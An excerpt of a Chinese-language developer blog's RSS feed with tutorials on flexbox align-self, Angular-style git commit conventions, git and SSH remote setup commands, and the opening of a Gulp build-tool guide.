<div><pre><code><span>.item</span> <span>{</span>
  <span>align-self</span><span>:</span> auto | flex-start | flex-end | center | baseline | stretch<span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><p><img src="/assets/flex-self.png" alt="align-self"></p>
<div><p>提示</p>
<p>该属性可能取六个值, 除了 <code>auto</code> , 其他都与 <code>align-items</code> 属性完全一致。</p>
</div>
</div>
]]></content:encoded>
      <enclosure url="https://vxhly.github.io/assets/flex-layout.png" type="image/png"/>
    </item>
    <item>
      <title>git commit 规范指南</title>
      <link>https://vxhly.github.io/views/manual/git-commit-specification-guide.html</link>
      <guid>https://vxhly.github.io/views/manual/git-commit-specification-guide.html</guid>
      <source url="https://vxhly.github.io/rss.xml">git commit 规范指南</source>
      <description>前言
目前, 社区有多种 Commit message 的写法规范。本文介绍 Angular 规范 是目前使用最广的写法, 比较合理和系统化, 并且有配套的工具。前前端框架 Angular.js 采用的就是该规范。

</description>
      <category>manual</category>
      <pubDate>Mon, 14 May 2018 14:25:43 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>目前, 社区有多种 Commit message 的写法规范。本文介绍 <a href="https://docs.google.com/document/d/1QrDFcIiPjSLDn3EL15IJygNPiHORgU1_OOAqWjiDU5Y/edit#heading=h.greljkmo14y0" target="_blank" rel="noopener noreferrer">Angular 规范</a> 是目前使用最广的写法, 比较合理和系统化, 并且有配套的工具。前前端框架 <a href="https://github.com/angular/angular.js/blob/master/CONTRIBUTING.md#toc10" target="_blank" rel="noopener noreferrer">Angular.js</a> 采用的就是该规范。</p>
</div>

<h2 id="commit-message-的作用" tabindex="-1"> Commit message 的作用</h2>
<h3 id="提供更多的历史信息-方便快速浏览。" tabindex="-1"> 提供更多的历史信息, 方便快速浏览。</h3>
<p>比如, 下面的命令显示上次发布后的变动, 每个 commit 占据一行。你只看行首, 就知道某次 commit 的目的。</p>
<div><pre><code><span>git</span> log <span>&lt;</span>last tag<span>></span> HEAD --pretty<span>=</span>format:%s
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="可以过滤某些-commit-比如文档改动-便于快速查找信息" tabindex="-1"> 可以过滤某些 commit（比如文档改动）, 便于快速查找信息</h3>
<div><pre><code><span>git</span> log <span>&lt;</span>last release<span>></span> HEAD --grep feature
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="可以直接从-commit-生成-change-log" tabindex="-1"> 可以直接从 commit 生成 Change log</h3>
<p>Change Log 是发布新版本时, 用来说明与上一个版本差异的文档, 详见后文</p>
<p><img src="/assets/git-commit-1.png" alt="Change Log"></p>
<h3 id="其他优点" tabindex="-1"> 其他优点</h3>
<ul>
<li>可读性好, 清晰, 不必深入看代码即可了解当前 commit 的作用。</li>
<li>为 Code Reviewing 做准备</li>
<li>方便跟踪工程历史</li>
<li>让其他的开发者在运行 git blame 的时候想跪谢</li>
<li>提高项目的整体质量, 提高个人工程素质</li>
</ul>
<h2 id="commit-message-的格式" tabindex="-1"> Commit message 的格式</h2>
<p>每次提交, Commit message 都包括三个部分: header, body 和 footer。</p>
<div><pre><code><span>&lt;</span>type<span>></span><span>(</span><span>&lt;</span>scope<span>></span><span>)</span>: <span>&lt;</span>subject<span>></span>
<span>&lt;</span>BLANK LINE<span>></span>
<span>&lt;</span>body<span>></span>
<span>&lt;</span>BLANK LINE<span>></span>
<span>&lt;</span>footer<span>></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div></div></div><p>其中, header 是必需的, body 和 footer 可以省略。 不管是哪一个部分, 任何一行都不得超过 72 个字符（或 100 个字符）。这是为了避免自动换行影响美观。</p>
<h3 id="header" tabindex="-1"> Header</h3>
<p>Header 部分只有一行, 包括三个字段: type（必需）、scope（可选）和 subject（必需）。</p>
<h4 id="type" tabindex="-1"> type</h4>
<p>用于说明 commit 的类别, 只允许使用下面 7 个标识。</p>
<ul>
<li><strong>feat</strong>: 一项新功能</li>
<li><strong>fix</strong>: 修复一个 bug</li>
<li><strong>docs</strong>: 仅仅修改文档（documentation）</li>
<li><strong>style</strong>: 不影响代码含义的更改（空格, 格式, 缺少分号等）</li>
<li><strong>refactor</strong>: 重构（即不是新增功能, 也不是修改 bug 的代码变动）</li>
<li><strong>perf</strong>: 改进性能的代码更改</li>
<li><strong>test</strong>: 添加缺失测试或更正现有测试</li>
<li><strong>build</strong>: 影响构建系统或外部依赖项的更改（示例范围: gulp, broccoli, npm）</li>
<li><strong>ci</strong>: 对 CI 配置文件和脚本的更改（示例范围: Travis, Circle, BrowserStack, SauceLabs）</li>
<li><strong>chore</strong>: 其他不修改 src 或测试文件的更改</li>
<li><strong>revert</strong>: 恢复之前的提交（即回滚）</li>
</ul>
<p>如果 type 为 <code>feat</code> 和 <code>fix</code> , 则该 commit 将肯定出现在 Change log 之中。其他情况（docs、chore、style、refactor、test）由你决定, 要不要放入 Change log, 建议是不要。</p>
<h4 id="scope" tabindex="-1"> scope</h4>
<p>scope 用于说明 commit 影响的范围, 比如数据层、控制层、视图层等等, 视项目不同而不同。</p>
<p>例如在 Angular, 可以是 $location, $browser, $compile, $rootScope, ngHref, ngClick, ngView 等。</p>
<p>如果你的修改影响了不止一个 scope, 你可以使用 <code>*</code> 代替。</p>
<h4 id="subject" tabindex="-1"> subject</h4>
<p>subject 是 commit 目的的简短描述, 不超过 50 个字符。</p>
<p>其他注意事项:</p>
<ul>
<li>以动词开头, 使用第一人称现在时, 比如 change, 而不是 changed 或 changes</li>
<li>第一个字母小写</li>
<li>结尾不加句号（.）</li>
</ul>
<h3 id="body" tabindex="-1"> Body</h3>
<p>Body 部分是对本次 commit 的详细描述, 可以分成多行。下面是一个范例。</p>
<div><pre><code>More detailed explanatory text, if necessary. Wrap it to about 72 characters or so.

Further paragraphs come after blank lines.

<span>-</span> Bullet points are okay, too
<span>-</span> Use a hanging indent
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>有两个注意点:</p>
<ul>
<li>使用第一人称现在时, 比如使用 change 而不是 changed 或 changes。</li>
<li>永远别忘了第 2 行是空行</li>
<li>应该说明代码变动的动机, 以及与以前行为的对比。</li>
</ul>
<h3 id="footer" tabindex="-1"> Footer</h3>
<p>Footer 部分只用于以下两种情况:</p>
<h4 id="不兼容变动" tabindex="-1"> 不兼容变动</h4>
<p>如果当前代码与上一个版本不兼容, 则 Footer 部分以 BREAKING CHANGE 开头, 后面是对变动的描述、以及变动理由和迁移方法。</p>
<div><pre><code>BREAKING CHANGE: isolate scope bindings definition has changed.

<span>    To migrate the code follow the example below:</span>

<span>    Before:</span>

<span>    scope: {
      myAttr: 'attribute',
    }</span>

<span>    After:</span>

<span>    scope: {
      myAttr: '@',
    }</span>

<span>    The removed `inject` wasn't generaly useful for directives so there should be no code using it.</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h4 id="关闭-issue" tabindex="-1"> 关闭 Issue</h4>
<p>如果当前 commit 针对某个 issue, 那么可以在 Footer 部分关闭这个 issue 。</p>
<div><pre><code>Closes <span>#234</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h4 id="revert" tabindex="-1"> Revert</h4>
<p>还有一种特殊情况, 如果当前 commit 用于撤销以前的 commit, 则必须以 revert: 开头, 后面跟着被撤销 Commit 的 Header。</p>
<div><pre><code>revert: feat(pencil): add 'graphiteWidth' option

This reverts commit 667ecc1654a317a13331b17617d973392f415f02.
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><p>Body 部分的格式是固定的, 必须写成 <code>This reverts commit &lt;hash&gt;</code> ., 其中的 hash 是被撤销 commit 的 SHA 标识符。</p>
<p>如果当前 commit 与被撤销的 commit, 在同一个发布（release）里面, 那么它们都不会出现在 Change log 里面。如果两者在不同的发布, 那么当前 commit, 会出现在 Change log 的 Reverts 小标题下面。</p>
<h2 id="commitizen" tabindex="-1"> Commitizen</h2>
<p>可以使用典型的 git 工作流程或通过使用 CLI 向导 Commitizen 来添加提交消息格式。</p>
<p>安装</p>
<div><pre><code><span>npm</span> <span>install</span> -g commitizen
</code></pre><div aria-hidden="true"><div></div></div></div><p>然后, 在项目目录里, 运行下面的命令, 使其支持 Angular 的 Commit message 格式。</p>
<div><pre><code>commitizen init cz-conventional-changelog --save --save-exact
</code></pre><div aria-hidden="true"><div></div></div></div><p>以后, 凡是用到 <code>git commit</code> 命令, 一律改为使用 <code>git cz</code> 。这时, 就会出现选项, 用来生成符合格式的 Commit message。</p>
<h2 id="生成-change-log" tabindex="-1"> 生成 Change log</h2>
<p>如果你的所有 Commit 都符合 Angular 格式, 那么发布新版本时, Change log 就可以用脚本自动生成。生成的文档包括以下三个部分:</p>
<div><pre><code>New features

Bug fixes

Breaking changes.
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div></div></div><p>每个部分都会罗列相关的 commit , 并且有指向这些 commit 的链接。当然, 生成的文档允许手动修改, 所以发布前, 你还可以添加其他内容。</p>
<p><a href="https://github.com/ajoslin/conventional-changelog" target="_blank" rel="noopener noreferrer">conventional-changelog</a> 就是生成 Change log 的工具, 运行下面的命令即可。</p>
<div><pre><code><span>npm</span> <span>install</span> -g conventional-changelog-cli
<span>cd</span> my-project
conventional-changelog -p angular -i CHANGELOG.md -s -r <span>0</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><p>当然你也可以在你的 <code>package.json</code> 中添加快捷 script</p>
<div><pre><code><span>{</span>
  <span>"script"</span><span>:</span> <span>{</span>
    <span>"changelog"</span><span>:</span> <span>"conventional-changelog -p angular -i src/CHANGELOG.md -s -r 0"</span>
  <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div></div></div>]]></content:encoded>
      <enclosure url="https://vxhly.github.io/assets/git-commit-1.png" type="image/png"/>
    </item>
    <item>
      <title>Git 远程推送配置</title>
      <link>https://vxhly.github.io/views/manual/git-push-setting.html</link>
      <guid>https://vxhly.github.io/views/manual/git-push-setting.html</guid>
      <source url="https://vxhly.github.io/rss.xml">Git 远程推送配置</source>
      <description>前言
Git 是一个开源的分布式版本控制系统, 可以有效、高速的处理从很小到非常大的项目版本管理。

</description>
      <category>manual</category>
      <pubDate>Sun, 31 Jul 2016 16:09:21 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>Git 是一个开源的分布式版本控制系统, 可以有效、高速的处理从很小到非常大的项目版本管理。</p>
</div>

<h2 id="安装-git" tabindex="-1"> 安装 Git</h2>
<p>如果你的系统还没有 Git, 请通过以下命令安装</p>
<div><pre><code><span>sudo</span> <span>apt-get</span> <span>install</span> <span>git</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="创建帐号" tabindex="-1"> 创建帐号</h2>
<p>创建你的 GitHub 帐号, 或者 Git@OSC 帐号</p>
<p><a href="http://github.com/" target="_blank" rel="noopener noreferrer">GitHub</a> 链接<br> <a href="http://git.oschina.net/" target="_blank" rel="noopener noreferrer">Git@OSC</a> 链接</p>
<h2 id="liunx-创建-ssh-密钥" tabindex="-1"> liunx 创建 SSH 密钥</h2>
<div><pre><code>ssh-keygen -t rsa -C <span>"xxxxx@xxxxx.com"</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="添加-public-key" tabindex="-1"> 添加 public key</h3>
<p>查看你的 public key, 并把它添加到您的账户中</p>
<p>如 <a href="http://github.com/settings/keys" target="_blank" rel="noopener noreferrer">GitHub key</a> 如 <a href="http://git.oschina.net/profile/sshkeys" target="_blank" rel="noopener noreferrer">Git@OSC key</a></p>
<p>使用以下命令查看</p>
<div><pre><code><span>cat</span> /home/youname/.ssh/id_rsa.pub
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="测试验证是否成功" tabindex="-1"> 测试验证是否成功</h3>
<div><pre><code><span>ssh</span> -T git@github.com
</code></pre><div aria-hidden="true"><div></div></div></div><p>或</p>
<div><pre><code><span>ssh</span> -T git@git.oschina.net
</code></pre><div aria-hidden="true"><div></div></div></div><p>返回你在 <code>GitHub</code> 或 <code>Git@OSC</code> 上注册的用户名代表成功。</p>
<h2 id="github-或-git-osc-上创建项目" tabindex="-1"> GitHub 或 Git@OSC 上创建项目</h2>
<p><a href="http://github.com/" target="_blank" rel="noopener noreferrer">GitHub</a> 链接<br> <a href="http://git.oschina.net/" target="_blank" rel="noopener noreferrer">Git@OSC</a> 链接</p>
<h2 id="本地配置" tabindex="-1"> 本地配置</h2>
<div><p>提示</p>
<p>尽量保持你的名字和你的邮箱和 GitHub 或 Git@OSC 的注册一致。</p>
</div>
<div><pre><code><span>git</span> config --global user.name <span>"your name"</span>
<span>git</span> config --global user.email <span>"your email"</span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h2 id="配置大小写敏感" tabindex="-1"> 配置大小写敏感</h2>
<div><p>提示</p>
<p>在 Git 中默认是不区分大小的, 因此当你修改了文件名的大小写后, git 并不会认为你有修改哦, 使用下面的配置可开启大小写敏感</p>
</div>
<div><pre><code><span>git</span> config core.ignorecase <span>false</span> --global
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="本地多个-ssh-key-的配置" tabindex="-1"> 本地多个 ssh-key 的配置</h2>
<p>在 <code>.ssh</code> 目录下面创建名为 <code>config</code> 的配置文件, 配置文件内容如下</p>
<div><pre><code>Host me.github.com <span># 相当于 DNS 的作用</span>
    HostName github.com <span># 解析的地址</span>
    PreferredAuthentications publickey
    IdentityFile ~/.ssh/me_rsa <span># 这是您生成密钥的文件名,注意是私钥的文件名</span>

Host work.github.com <span># 相当于 DNS 的作用</span>
    HostName github.com <span># 解析的地址</span>
    Port <span>2222</span> <span># 如果你改变了 ssh 的端口号</span>
    PreferredAuthentications publickey
    IdentityFile ~/.ssh/work_rsa <span># 这是您生成密钥的文件名,注意是私钥的文件名</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p><code>测试连接</code></p>
<div><pre><code><span>ssh</span> -T git@me.github.com  <span># => 将会自动解析成 git@github.com</span>
<span>ssh</span> -T git@work.github.com <span># => 将会自动解析成 git@github.com</span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h2 id="常用命令" tabindex="-1"> 常用命令</h2>
<h3 id="进入项目目录-初始化" tabindex="-1"> 进入项目目录, 初始化</h3>
<div><pre><code><span>git</span> init
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="添加项目至本地仓库" tabindex="-1"> 添加项目至本地仓库</h3>
<div><pre><code><span>git</span> <span>add</span> <span>.</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="提交并备注" tabindex="-1"> 提交并备注</h3>
<div><pre><code><span>git</span> commit -m <span>"first commit"</span>
<span>git</span> remote <span>add</span> origin git@github.com:<span>[</span>youName<span>]</span>/<span>[</span>appName<span>]</span>.git
<span>git</span> push -u origin master
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><h3 id="解决冲突" tabindex="-1"> 解决冲突</h3>
<div><pre><code><span>git</span> pull origin master
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="强制覆盖本地代码-更新本地源" tabindex="-1"> 强制覆盖本地代码（更新本地源）</h3>
<div><pre><code><span>git</span> fetch --all
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="创建一个新的标签并提交" tabindex="-1"> 创建一个新的标签并提交</h3>
<div><pre><code><span>git</span> tag -a v1.0.0 -m <span>"test@1.0.0"</span>
<span>git</span> push origin --tags
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h3 id="查看本地标签" tabindex="-1"> 查看本地标签</h3>
<div><pre><code><span>git</span> tag
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="删除远程-tag" tabindex="-1"> 删除远程 tag</h3>
<div><pre><code><span>git</span> push origin --delete tag <span>[</span>tagname<span>]</span>
<span>git</span> tag -d <span>[</span>tagname<span>]</span> <span># 删除本地 tag</span>
<span>git</span> push origin :refs/tags/<span>[</span>tagname<span>]</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><h3 id="获取远程-tag" tabindex="-1"> 获取远程 tag</h3>
<div><pre><code><span>git</span> fetch origin tag <span>[</span>tagname<span>]</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="修改-remote" tabindex="-1"> 修改 remote</h3>
<div><pre><code><span>git</span> remote set-url origin git@<span>[</span>URL<span>]</span>:<span>[</span>userName<span>]</span>/<span>[</span>projectName<span>]</span>
<span># or</span>
<span>git</span> remote <span>rm</span> origin
<span>git</span> remote <span>add</span> origin git@<span>[</span>URL<span>]</span>:<span>[</span>userName<span>]</span>/<span>[</span>projectName<span>]</span>.git
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div></div></div><h3 id="查看远程分支" tabindex="-1"> 查看远程分支</h3>
<div><pre><code><span>git</span> branch -a
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="查看本地分支" tabindex="-1"> 查看本地分支</h3>
<div><pre><code><span>git</span> branch
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="创建本地分支" tabindex="-1"> 创建本地分支</h3>
<div><pre><code><span>git</span> branch <span>[</span>branchName<span>]</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="创建一个空分支" tabindex="-1"> 创建一个空分支</h3>
<div><pre><code><span>git</span> branch --orphan <span>[</span>branchName<span>]</span> <span># 创建无历史提交的分支</span>
<span>git</span> <span>rm</span> -rf <span>.</span> <span># 删除本地代码</span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h3 id="删除远程分支" tabindex="-1"> 删除远程分支</h3>
<div><pre><code><span>git</span> push origin --delete <span>[</span>branchName<span>]</span>
<span># or</span>
<span>git</span> push origin :<span>[</span>branchName<span>]</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><h3 id="本地分支推送到远程分支" tabindex="-1"> 本地分支推送到远程分支</h3>
<div><pre><code><span>git</span> push origin <span>[</span>branchName<span>]</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="切换分支" tabindex="-1"> 切换分支</h3>
<div><pre><code><span>git</span> checkout <span>[</span>branchName<span>]</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="合并分支" tabindex="-1"> 合并分支</h3>
<div><pre><code><span>git</span> checkout master
<span>git</span> merge <span>[</span>branchName<span>]</span>
<span>git</span> push origin master
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><p>如果分支合并时出现了冲突, 那么只能强上了</p>
<div><pre><code><span>git</span> branch -m master old-master
<span>git</span> branch -m <span>[</span>branchName<span>]</span> master
<span>git</span> push -f origin master
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><h3 id="submodule" tabindex="-1"> submodule</h3>
<p>当项目越来越庞大之后, 不可避免的要拆分成多个子模块, 我们希望各个子模块有独立的版本管理, 并且由专门的人去维护, 这时候我们就要用到 git 的 submodule 功能。</p>
<div><pre><code><span>git</span> clone <span>&lt;</span>repository<span>></span> --recursive 递归的方式克隆整个项目
<span>git</span> submodule <span>add</span> <span>&lt;</span>repository<span>></span> <span>&lt;</span>path<span>></span> 添加子模块
<span>git</span> submodule init 初始化子模块
<span>git</span> submodule update 更新子模块
<span>git</span> submodule foreach <span>git</span> pull 拉取所有子模块
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div></div></div><p>删除子模块</p>
<div><pre><code><span># 逆初始化模块, 其中{MOD_NAME}为模块目录, 执行后可发现模块目录被清空</span>
<span>git</span> submodule deinit <span>{</span>MOD_NAME<span>}</span>
<span># 删除.gitmodules中记录的模块信息（--cached选项清除.git/modules中的缓存）</span>
<span>git</span> <span>rm</span> --cached <span>{</span>MOD_NAME<span>}</span>
<span># 提交更改到代码库, 可观察到'.gitmodules'内容发生变更</span>
<span>git</span> commit -am <span>"Remove a submodule."</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>修改模块的 URL</p>
<ol>
<li>修改'.gitmodules'文件中对应模块的”url“属性;</li>
<li>使用 <code>git submodule sync</code> 命令, 将新的 URL 更新到文件 <code>.git/config</code> # git 中配置 autocrlf</li>
</ol>
<h2 id="高级用法" tabindex="-1"> 高级用法</h2>
<h3 id="批量修改历史-commit-的用户名和邮箱" tabindex="-1"> 批量修改历史 commit 的用户名和邮箱</h3>
<div><pre><code><span>#!/bin/sh</span>

<span>git</span> filter-branch --env-filter <span>'

OLD_EMAIL="原邮箱地址"
CORRECT_NAME="新用户名"
CORRECT_EMAIL="新邮箱地址"

if [ "$GIT_COMMITTER_EMAIL" = "$OLD_EMAIL" ]
then
    export GIT_COMMITTER_NAME="$CORRECT_NAME"
    export GIT_COMMITTER_EMAIL="$CORRECT_EMAIL"
fi
if [ "$GIT_AUTHOR_EMAIL" = "$OLD_EMAIL" ]
then
    export GIT_AUTHOR_NAME="$CORRECT_NAME"
    export GIT_AUTHOR_EMAIL="$CORRECT_EMAIL"
fi
'</span> --tag-name-filter <span>cat</span> -- --branches --tags
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="换行符" tabindex="-1"> 换行符</h2>
<h3 id="源文件中是换行符是-lf" tabindex="-1"> 源文件中是换行符是 LF</h3>
<p>如果你的源文件中是换行符是 LF, 而 <code>autocrlf=true</code> , 此时 <code>Git add .</code> 就会遇到 <code>fatal: LF would be replaced by CRLF</code> 的错误。有两个解决办法:</p>
<ol>
<li>将你的源文件中的 LF 转为 CRLF 即可【推荐】</li>
<li>将 autocrlf 设置为 false</li>
</ol>
<h3 id="源文件中是换行符是-crlf" tabindex="-1"> 源文件中是换行符是 CRLF</h3>
<p>如果你的源文件中是换行符是 CRLF, 而 <code>autocrlf=input</code> , 此时 <code>Git add .</code> 也会遇到 <code>fatal: CRLF would be replaced by LF</code> 的错误。有两个解决办法:</p>
<ol>
<li>将你源文件中的 CRLF 转为 LF【推荐】</li>
<li>将 autocrlf 设置为 true 或者 false</li>
</ol>
<h2 id="core-autocrlf" tabindex="-1"> core.autocrlf</h2>
<p>Git 可以在你提交时自动地把行结束符 CRLF 转换成 LF, 而在签出代码时把 LF 转换成 CRLF。用 core.autocrlf 来打开此项功能, 如果是在 Windows 系统上, 把它设置成 true, 这样当签出代码时, LF 会被转换成 CRLF:</p>
<div><pre><code><span>git</span> config --global core.autocrlf <span>true</span>
</code></pre><div aria-hidden="true"><div></div></div></div><p>Linux 或 Mac 系统使用 LF 作为行结束符, 因此你不想 Git 在签出文件时进行自动的转换；当一个以 CRLF 为行结束符的文件不小心被引入时你肯定想进行修正, 把 core.autocrlf 设置成 input 来告诉 Git 在提交时把 CRLF 转换成 LF, 签出时不转换:</p>
<div><pre><code><span>git</span> config --global core.autocrlf input
</code></pre><div aria-hidden="true"><div></div></div></div><p>这样会在 Windows 系统上的签出文件中保留 CRLF, 会在 Mac 和 Linux 系统上, 包括仓库中保留 LF。</p>
<p>如果你是 Windows 程序员, 且正在开发仅运行在 Windows 上的项目, 可以设置 false 取消此功能, 把回车符记录在库中:</p>
<div><pre><code><span>git</span> config --global core.autocrlf <span>false</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="建议" tabindex="-1"> 建议</h2>
<p>在 Mac/Liunx 上设置 <code>autocrlf = input</code> , 在 Windows 上设置 autocrlf = true（默认值）。</p>
<p>Windows: （true） 提交时, 将 CRLF 转成 LF 再提交；切出时, 自动将 LF 转为 CRLF;</p>
<p>MAC/Linux: (input) 提交时, 将 CRLF 转成 LF 再提交；切出时, 保持 LF 即可</p>
<p>这样即可保证仓库中永远都是 LF. 而且在 Windows 工作空间都是 CRLF, 在 Mac/linux 工作空间都是 LF</p>
]]></content:encoded>
    </item>
    <item>
      <title>Gulp 使用指南</title>
      <link>https://vxhly.github.io/views/manual/gulp-usage-guide.html</link>
      <guid>https://vxhly.github.io/views/manual/gulp-usage-guide.html</guid>
      <source url="https://vxhly.github.io/rss.xml">Gulp 使用指南</source>
      <description>前言
本文主要介绍如何使用 Gulp.js, 来帮助你构建一个自动化的前端开发流程。总结并归类自身使用中所遇到的方法、问题, 便于新人上手和理解, 同时也作为一份 Gulp 参考文档来使用, 让你对 Gulp 有个更深入的了解。

</description>
      <category>manual</category>
      <pubDate>Fri, 28 Oct 2016 19:06:15 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>本文主要介绍如何使用 Gulp.js, 来帮助你构建一个自动化的前端开发流程。总结并归类自身使用中所遇到的方法、问题, 便于新人上手和理解, 同时也作为一份 Gulp 参考文档来使用, 让你对 Gulp 有个更深入的了解。</p>
</div>

<h2 id="gulp-是什么" tabindex="-1"> Gulp 是什么</h2>
<p>Gulp 是基于 <code>Node.js</code> 的一个构建工具（自动任务运行器）, 开发者可以使用它构建自动化工作流程（前端集成开发环境）。一些常见、重复的任务, 例如: 网页自动刷新、CSS 预处理、代码检测、压缩图片、等等, 只需用简单的命令就能全部完成。使用它, 可以简化工作, 让你把重点放在功能开发上；同时减少人为失误, 提高开发效率和项目质量, 让专注更为专注。如果你之前接触过 Grunt, 那上手 Gulp 就会觉得非常容易理解。</p>
<h2 id="为什么使用-gulp-而不使用-grunt" tabindex="-1"> 为什么使用 Gulp 而不使用 Grunt</h2>
<p>构建前端自动化的工具有很多, 如: <code>Grunt</code> , <code>Brunch</code> , <code>Broccoli</code> 等, 而目前过内最流行的属于 Grunt, 之前我也在用使用, 那为什么选择 Gulp 来代替 Grunt？</p>
<p>简单的总结一下, 有三点:</p>
<ul>
<li>简洁: Gulp 侧重 <code>“代码优于配置”(code over configuration)</code> 。最直观的感受, 更为简单和清晰, 不需要像 Grunt 一样写一堆庞大的配置文件。</li>
<li>高效: Gulp 基于 <code>Node Streams（流</code> ）来构建任务, 避免磁盘反复 <code>I/O（读取/写入）</code> 。每个任务都是单独执行（坚持做一件事并且做好它）, 这使得它速度更快、更为纯粹。</li>
<li>易学: Gulp 核心 API 只有 4 个。简洁的 API 易于上手, 学习过程比较平滑。</li>
</ul>
<h2 id="gulp-核心-api" tabindex="-1"> Gulp 核心 API</h2>
<p>Gulp 的核心 API 只有 4 个: <code>src</code> 、 <code>dest</code> 、 <code>task</code> 、 <code>watch</code></p>
<ul>
<li><code>gulp.src(globs[, options])</code> =&gt; 指明源文件路径。<strong>globs</strong>: 路径模式匹配; <strong>options</strong>: 可选参数；</li>
<li><code>gulp.dest(path[, options])</code> =&gt; 指明处理后的文件输出路径。<strong>path</strong>: 路径（一个任务可以有多个输出路径）；<strong>options</strong>: 可选参数；</li>
<li><code>gulp.task(name[, deps], fn)</code> =&gt; 注册任务。<strong>name</strong>: 任务名称（通过 gulp name 来执行这个任务）; <strong>deps</strong>: 可选的数组, 在本任务运行中所需要所依赖的其他任务（当前任务在依赖任务执行完毕后才会执行）; <strong>fn</strong>: 任务函数（function 方法）；</li>
<li><code>gulp.watch(glob [, opts], tasks)</code> =&gt; 监视文件的变化并运行相应的任务。<strong>glob</strong>: 路径模式匹配; <strong>opts</strong>: 可以选配置对象; <strong>taks</strong>: 执行的任务；</li>
</ul>
<p><a href="http://github.com/gulpjs/gulp/blob/master/docs/API.md" target="_blank" rel="noopener noreferrer">API 帮助文档</a></p>
<h2 id="安装-gulp" tabindex="-1"> 安装 Gulp</h2>
<p>安装 Gulp 之前要确定系统中安装了 Node.js, 有了之后只需创建一个工作目录, 以下操作均在工作目录下执行。</p>
<h3 id="全局安装" tabindex="-1"> 全局安装</h3>
<p>深入设置任务之前, 需先安装 gulp:</p>
<div><pre><code><span>npm</span> <span>install</span> gulp -g
</code></pre><div aria-hidden="true"><div></div></div></div><p>这会将 gulp 安装到全域环境下, 让你可以存取 gulp 的 CLI。</p>
<h3 id="本地安装" tabindex="-1"> 本地安装</h3>
<p>接着, 需要在本地的工在目录进行安装。切换至你的工作目录, 执行以下命令（当然执行之前要先确定该目录下有 <code>package.json</code> 文件, 如果没有可以通过 <code>npm init</code> 进行创建）</p>
<div><pre><code><span>npm</span> <span>install</span> gulp --save-dev
</code></pre><div aria-hidden="true"><div></div></div></div><p>上述指令将 gulp 安装到本地的工作目录, 并纪录于 <code>package.json</code> 中的 <code>devDependencies</code> 选项内。</p>
<h2 id="安装-gulp-插件" tabindex="-1"> 安装 Gulp 插件</h2>
<h3 id="推荐插件" tabindex="-1"> 推荐插件</h3>
<ul>
<li>静态服务器 (<a href="http://github.com/schickling/gulp-webserver" target="_blank" rel="noopener noreferrer">gulp-webserver</a>)</li>
<li>网页自动刷新 ([gulp-livereload][<a href="https://github.com/vohof/gulp-livereload" target="_blank" rel="noopener noreferrer">https://github.com/vohof/gulp-livereload</a>])</li>
<li>编译 <strong>Sass</strong> (<a href="http://github.com/sindresorhus/gulp-ruby-sass" target="_blank" rel="noopener noreferrer">gulp-ruby-sass</a>)</li>
<li><strong>Autoprefixer</strong> (<a href="http://github.com/Metrime/gulp-autoprefixer" target="_blank" rel="noopener noreferrer">gulp-autoprefixer</a>)</li>
<li>缩小化(minify) <strong>CSS</strong> (<a href="http://github.com/jonathanepollack/gulp-minify-css" target="_blank" rel="noopener noreferrer">gulp-minify-css</a>)</li>
<li><strong>JSHint</strong> (<a href="http://github.com/wearefractal/gulp-jshint" target="_blank" rel="noopener noreferrer">gulp-jshint</a>)</li>
<li>拼接 (<a href="http://github.com/wearefractal/gulp-concat" target="_blank" rel="noopener noreferrer">gulp-concat</a>)</li>
